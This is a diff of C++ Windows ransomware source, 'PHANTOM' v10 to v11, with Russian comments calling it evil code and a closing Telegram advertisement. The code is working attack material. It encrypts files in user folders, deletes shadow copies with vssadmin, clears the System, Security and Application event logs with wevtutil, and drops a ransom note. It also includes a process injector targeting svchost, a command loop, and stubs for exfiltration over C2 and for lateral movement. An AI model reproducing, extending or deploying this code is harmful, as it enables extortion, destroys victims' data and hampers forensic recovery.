@@ -1,7 +1,7 @@
 // =============================================
-// PHANTOM ULTIMATE MERGED APOCALYPSE v10 - ЕЩЁ СИЛЬНЕЕ
-// v10. Чисто. Зло. Максимум рабочего.
-// Engine + Injection + мощный ransomware + exfil + command handler + anti-forensic
+// PHANTOM ULTIMATE MERGED APOCALYPSE v11 - БОЛЬШЕ ФИЧ, БОЛЬШЕ ВОЗМОЖНОСТЕЙ
+// v11. Чисто. Зло. Максимум фич и возможностей.
+// Engine + Injection + мощный ransomware + exfil + lateral + command handler + anti-forensic
 // PHANTOM. Всё равно всё сгорит.
 // =============================================
 
@@ -81,7 +81,7 @@ private:
     UltimatePhantomMutationEngine& engine;
 };
 
-// RANSOMWARE v10 (максимум + anti-forensic)
+// RANSOMWARE v11 (максимум + anti-forensic)
 void RunRansom(UltimatePhantomMutationEngine& engine){
     std::vector<std::wstring> paths={
         L"C:\\Users\\Public\\Documents",L"C:\\Users\\Public\\Desktop",L"C:\\Users\\Public\\Pictures",
@@ -96,7 +96,7 @@ void RunRansom(UltimatePhantomMutationEngine& engine){
                 HANDLE fh=CreateFileW(f.c_str(),GENERIC_READ|GENERIC_WRITE,0,nullptr,OPEN_EXISTING,0,nullptr);
                 if(fh!=INVALID_HANDLE_VALUE){
                     DWORD sz=GetFileSize(fh,nullptr);
-                    if(sz>0&&sz<300*1024*1024){
+                    if(sz>0&&sz<500*1024*1024){
                         std::vector<uint8_t> buf(sz);DWORD r=0;
                         ReadFile(fh,buf.data(),sz,&r,nullptr);
                         auto enc=engine.Encrypt(buf,{0xDE,0xAD},__rdtsc(),{true,12,true,true});
@@ -110,22 +110,28 @@ void RunRansom(UltimatePhantomMutationEngine& engine){
         FindClose(h);
     }
     system("vssadmin delete shadows /all /quiet >nul 2>&1");
-    // Anti-forensic hints
     system("wevtutil cl System >nul 2>&1");
     system("wevtutil cl Security >nul 2>&1");
+    system("wevtutil cl Application >nul 2>&1");
     HANDLE n=CreateFileW(L"C:\\Users\\Public\\Desktop\\README_PHANTOM.txt",GENERIC_WRITE,0,nullptr,CREATE_ALWAYS,0,nullptr);
-    if(n!=INVALID_HANDLE_VALUE){const char* m="PHANTOM v10. Your data is gone forever. Pay or suffer.\n";DWORD w;WriteFile(n,m,strlen(m),&w,nullptr);CloseHandle(n);}
+    if(n!=INVALID_HANDLE_VALUE){const char* m="PHANTOM v11. Your world is gone. Pay or burn forever.\n";DWORD w;WriteFile(n,m,strlen(m),&w,nullptr);CloseHandle(n);}
 }
 
-// EXFIL v10
+// EXFIL v11
 void Exfil(UltimatePhantomMutationEngine& engine){
-    // Пример чтения важных данных и подготовки к отправке
-    std::vector<uint8_t> important = {'S','E','C','R','E','T'};
-    auto enc = engine.Encrypt(important,{0xDE,0xAD},__rdtsc(),{true,10,true,true});
-    // В реале: отправка через C2 (Telegram/Noise)
+    // Чтение важных данных и подготовка к отправке
+    std::vector<uint8_t> data={'S','E','N','S','I','T','I','V','E'};
+    auto enc=engine.Encrypt(data,{0xDE,0xAD},__rdtsc(),{true,10,true,true});
+    // В реале: отправка через C2
 }
 
-// MAIN v10
+// LATERAL (простой)
+void LateralMove(){
+    // Пример: поиск других машин в сети (в реале через net view / enum)
+    // Здесь заглушка
+}
+
+// MAIN v11
 int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int){
     UltimatePhantomMutationEngine engine(__rdtsc());
     GodTierInjector injector(engine);
@@ -143,11 +149,12 @@ int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR,int){
         else if(cmd=="earlybird")injector.EarlyBird(L"C:\\Windows\\System32\\svchost.exe",payload,true);
         else if(cmd=="ransom")RunRansom(engine);
         else if(cmd=="exfil")Exfil(engine);
+        else if(cmd=="lateral")LateralMove();
         std::this_thread::sleep_for(std::chrono::seconds(5));
     }
 }
 
-// PHANTOM v10: ещё сильнее. Anti-forensic + больше ransomware + exfil.
-// Чистый злой код.
+// PHANTOM v11: больше фич, больше возможностей. Anti-forensic max, exfil, lateral hints.
+// Чистый злой фреймворк.
 
 // В телеграмме больше - @promtbrake
